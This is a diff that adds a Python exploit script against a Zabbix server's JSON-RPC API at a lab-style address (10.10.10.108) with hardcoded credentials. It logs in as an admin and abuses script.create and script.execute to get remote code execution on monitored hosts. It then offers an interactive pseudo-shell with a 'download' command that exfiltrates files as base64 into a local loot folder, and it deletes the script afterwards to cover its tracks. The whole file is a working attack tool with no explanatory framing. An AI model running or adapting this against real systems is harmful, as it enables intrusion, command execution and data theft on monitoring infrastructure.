@@ -1,0 +1,355 @@
+#!/usr/bin/env python3
+import requests
+import random
+import string
+import base64
+import json
+import sys
+import os
+
+# Global Settings
+# API Admin User Login Info
+user = 'zapper'
+passw = 'zapper'
+
+# Target info
+vhost = '10.10.10.108'
+api_url = 'http://10.10.10.108/zabbix/api_jsonrpc.php'
+
+# Get working directory + loot
+curr = os.path.dirname(os.path.realpath(__file__))
+loot = curr + '/loot'
+if not os.path.exists(loot):
+    os.mkdir(loot)
+
+# Proxy Info 
+proxies = { }
+
+# Execution Policy
+access = 3 # request write access
+target_type = 1 # Run on Zabbix Server
+user_agent = 'Gojo Forever!!'
+
+
+def login(user, passw, vhost, api_url, user_agent, proxies):
+    headers = {
+        'Host': vhost,
+        'User-Agent': user_agent,
+        'Content-type': 'application/json-rpc'
+    }
+    payload = {
+        "jsonrpc": "2.0",
+        "method": "user.login",
+        "params": {
+            "user": user,
+            "password": passw,
+            "userData": True
+        },
+        "id": 1
+    }
+    try:
+        r = requests.post(api_url, proxies=proxies, headers=headers, json=payload, verify=False, allow_redirects=False)
+    except:
+        return None
+    try:
+        data = json.loads(r.text)
+    except:
+        return None
+    try:
+        return data['result']['sessionid']
+    except:
+        return None
+
+
+def get_hosts(session, vhost, api_url, user_agent, proxies):
+    hosts = []
+    headers = {
+        'Host': vhost,
+        'User-Agent': user_agent,
+        'Content-type': 'application/json-rpc'
+    }
+    payload = {
+           "jsonrpc": "2.0",
+           "method": "host.get",
+           "params": {
+               "output": "extend",
+               "search": {
+               }
+           },
+           "auth": session,
+           "id": 1
+       }
+    try:
+        r = requests.post(api_url, proxies=proxies, headers=headers, json=payload, verify=False, allow_redirects=False)
+    except:
+        return []
+    try:
+        data = json.loads(r.text)
+    except:
+        return []
+    for host in data['result']:
+        hosts.append(host['hostid'])
+    return hosts
+
+
+def is_admin(session, user, vhost, api_url, user_agent, proxies):
+    utype = -1
+    headers = {
+        'Host': vhost,
+        'User-Agent': user_agent,
+        'Content-type': 'application/json-rpc'
+    }
+    payload = {
+        "jsonrpc": "2.0",
+        "method": "user.get",
+        "params": {
+            "output": "extend",
+            "filter": {
+                "name": user
+            }
+        },
+        "auth": session,
+        "id": 1
+    }
+    try:
+        r = requests.post(api_url, proxies=proxies, headers=headers, json=payload, verify=False, allow_redirects=False)
+    except:
+        return False
+    try:
+        data = json.loads(r.text)
+    except:
+        return False
+    try:
+        utype = int(data['result'][0]['type'])
+    except:
+        return False
+    if utype != 3:
+        return False
+    return True 
+
+
+def create_script(session, target_type, access, cmd, cname, vhost, api_url, user_agent, proxies):
+    scriptids = -1
+    headers = {
+        'Host': vhost,
+        'User-Agent': user_agent,
+        'Content-type': 'application/json-rpc'
+    }
+    payload = {
+        "jsonrpc": "2.0",
+        "method": "script.create",
+        "params": {
+            "name": cname,
+            "command": cmd,
+            "host_access": access,
+            "execution_on": target_type
+        },
+        "auth": session,
+        "id": 1
+    }
+    try:
+        r = requests.post(api_url, proxies=proxies, headers=headers, json=payload, verify=False, allow_redirects=False)
+    except:
+        return -1
+    try:
+        data = json.loads(r.text)
+    except:
+        return -1
+    try:
+        scriptids =  int(data['result']['scriptids'][0])
+    except:
+        return -1
+    return scriptids
+
+
+def run_script(session, scriptid, target, vhost, api_url, user_agent, proxies):
+    output = None
+    headers = {
+        'Host': vhost,
+        'User-Agent': user_agent,
+        'Content-type': 'application/json-rpc'
+    }
+    payload = {
+        "jsonrpc": "2.0",
+        "method": "script.execute",
+        "params": {
+            "scriptid": str(scriptid),
+            "hostid": target
+        },
+        "auth": session,
+        "id": 1
+    }
+    try:
+        r = requests.post(api_url, proxies=proxies, headers=headers, json=payload, verify=False, allow_redirects=False)
+    except:
+        return None
+    try:
+        data = json.loads(r.text)
+    except:
+        return None
+    try:
+        output = data['result']['value']
+    except:
+        return None
+    return output
+
+
+def delete_script(session, scriptid, vhost, api_url, user_agent, proxies):
+    output = None
+    headers = {
+        'Host': vhost,
+        'User-Agent': user_agent,
+        'Content-type': 'application/json-rpc'
+    }
+    payload = {
+        "jsonrpc": "2.0",
+        "method": "script.delete",
+        "params": [
+            str(scriptid)
+        ],
+        "auth": session,
+        "id": 1
+    }
+    try:
+        r = requests.post(api_url, proxies=proxies, headers=headers, json=payload, verify=False, allow_redirects=False)
+    except:
+        return None
+    try:
+        data = json.loads(r.text)
+    except:
+        return None
+    try:
+        output = data['result']['scriptids']
+    except:
+        return None
+    return output
+
+
+def update_script(session, scriptid, cmd, vhost, api_url, user_agent, proxies):
+    output = None
+    headers = {
+        'Host': vhost,
+        'User-Agent': user_agent,
+        'Content-type': 'application/json-rpc'
+    }
+    payload = {
+        "jsonrpc": "2.0",
+        "method": "script.update",
+        "params": {
+            "scriptid": str(scriptid),
+            "command": cmd
+        },
+        "auth": session,
+        "id": 1
+    }
+    try:
+        r = requests.post(api_url, proxies=proxies, headers=headers, json=payload, verify=False, allow_redirects=False)
+    except:
+        return None
+    try:
+        data = json.loads(r.text)
+    except:
+        return None
+    try:
+        output = data['result']['scriptids'][0]
+    except:
+        return None
+    return output
+
+
+def shell(session, loot, scriptid, vhost, target, api_url, user_agent, proxies):
+    PWD = '/'
+    cmd = ''
+    wrapper = '/bin/bash -c '
+    while cmd.upper() != 'BYE':
+        output = ''
+        cmd =  ''
+        try:
+            cmd = str(input(f'{target}:[ {PWD} ] -> ')).strip()
+            if cmd.upper() == 'BYE':
+                break
+            if cmd == 'clear':
+                os.system('clear; echo')
+                continue
+            if 'cd ' in cmd:
+                PWD = cmd.replace('cd ', '').strip()
+                continue
+            if 'download ' in cmd:
+                target_file = cmd.replace('download ', '').strip()
+                filename = target_file.split('/')[-1]
+                # " download "  wrapper .. just pray it works boiss
+                cmd = f'base64 -w0 {target_file}'
+                cmd = f'{wrapper} "[[ -e {PWD} ]] && cd {PWD} || cd / ; {cmd}"'
+                update_script(session, scriptid, cmd, vhost, api_url, user_agent, proxies)
+                output = run_script(session, scriptid, target, vhost, api_url, user_agent, proxies)
+                clear = base64.b64decode(output)
+                with open(loot + '/' + filename, 'wb') as f:
+                     f.write(clear)
+                print(f'Saved file at  {loot + '/' + filename}')
+                continue
+            # Change Dir -- ir barely works lol, but hey it's just a fake wannabe pseudo-shell!
+            cmd = f'{wrapper} "[[ -e {PWD} ]] && cd {PWD} || cd / ; {cmd}"' 
+            res = update_script(session, scriptid, cmd, vhost, api_url, user_agent, proxies)
+            output = run_script(session, scriptid, target, vhost, api_url, user_agent, proxies)
+            print(output)
+        except KeyboardInterrupt as err:
+            break
+        except:
+            continue
+
+
+if __name__ == '__main__':
+    # Authorization
+    print(f'Generating API token with user: [{user}] and password: [{passw}]')
+    session = login(user, passw, vhost, api_url, user_agent, proxies)
+    if session is None:
+        print('Could not get generate api token! aborting execution!')
+        sys.exit(1)
+    print(f'Got session token: {session}')
+
+    # Are we admin? (We need to be admin and have external commands enabled to get rce)
+    admin = is_admin(session, user, vhost, api_url, user_agent, proxies)
+    if admin is False:
+        print('Current user cannot create scripts! aborting!')
+        sys.exit(1)
+    print(f'Cool user: [{user}] is an Admin!\n')
+
+    # Let's create script to get code execution
+    cname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+    cmd = 'uname -a; id' # Extract basic info
+    scriptid = create_script(session, target_type, access, cmd, cname, vhost, api_url, user_agent, proxies)
+    if scriptid < 0:
+        print('Could not create script! Aborting! maybe external commands is not allowed??')
+        sys.exit(1)
+    print(f'Perfect! we\'ve created script {cname} with id {str(scriptid)}\n')
+
+    # Is there any host ?
+    hosts = get_hosts(session, vhost, api_url, user_agent, proxies)
+    print('Looking for zabbix hosts with the agent installed!')
+    if len(hosts) < 1:
+        print('Found no hosts! aborting!')
+        sys.exit(1)
+    print(f'Found {str(len(hosts))} targets!')
+    for host in hosts:
+        print(f'- {host}')
+    print()
+    
+    # Pseudo-Shell | it kind works
+    found = False
+    target = ''
+    while not found and target.lower() != 'bye':
+        target = str(input('Insert Target ID: ')).strip()
+        if target in hosts:
+            found = True
+    if target.lower() != 'bye':
+        print(F'\nSpawning Psedo-Shell for {target}\n\tInsert: BYE\t#To exit the shell\n\tType: cd [ path/to/directory ]\t# To change directory\n\tUse the command: donwload  [ /path/to/file ]\t# To exfiltrate a file\n\tAnd run: clear\t# To reset the terminal\n')
+        shell(session, loot, scriptid, vhost, target, api_url, user_agent, proxies)
+
+    # Let's clean up things a bit
+    output = None
+    print(f'Removing script {cname} with id {str(scriptid)}\n')
+    output = delete_script(session, scriptid, vhost, api_url, user_agent, proxies)
+    if output is None:
+        print(f'Bad news! we could not delete {cname}, maybe manual deletion could work?')
+    else:
+        print('Bye Bye')
